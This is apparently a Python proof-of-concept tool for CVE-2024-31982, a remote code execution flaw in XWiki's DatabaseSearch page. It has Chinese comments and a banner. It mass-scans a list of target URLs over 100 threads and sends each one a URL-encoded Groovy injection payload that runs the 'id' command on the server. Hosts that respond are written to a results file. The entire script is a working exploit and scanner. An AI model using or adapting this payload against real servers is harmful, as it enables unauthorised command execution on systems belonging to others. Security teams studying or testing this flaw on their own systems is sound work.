#CVE-2024-31982 XWiki DatabaseSearch 远程代码执行漏洞 .py
import re,requests,argparse,sys,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 解除警告
def banner():
    test = """   ____   ____  ____ _ ____  _ _____  ___  
 / ___| / ___|/ ___/ |___ \/ |___ / ( _ ) 
 \___ \| |  _| |  _| | __) | | |_ \ / _ \ 
  ___) | |_| | |_| | |/ __/| |___) | (_) |
 |____/ \____|\____|_|_____|_|____/ \___/ 
                                          
                                version:1.0.8 
                                author:guoguo12138                             
"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description='CVE-2024-31982')
    parser.add_argument('-u','--url',dest='url',type=str,help='input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    #判断输入的参数是单个还是文件
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        #多线程
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload_url = "/bin/get/Main/DatabaseSearch?outputSyntax=plain&text=%7D%7D%7D%7B%7Basync%20async=false%7D%7D%7B%7Bgroovy%7D%7Dthrow%20new%20Exception%28%27id%27.execute%28%29.text%29%3B%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D%20"
    url = target+payload_url
    headers={
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0',
        'Accept':'application/json, text/javascript, */*; q=0.01',
        'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding':'gzip, deflate',
        'Connection':'close',
    }
    
    try:
        res = requests.get(url=url,headers=headers,verify=False,timeout=5)
        if res.status_code == 200 and "gid" in res.text :
            print(f"[+]该url存在漏洞{target}\n")
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+"\n")
                return True
        else:
            print(f"[-]该url不存在漏洞")
    except :
        print(f"[*]该url存在问题")
        return False

if __name__ == '__main__':
    main()
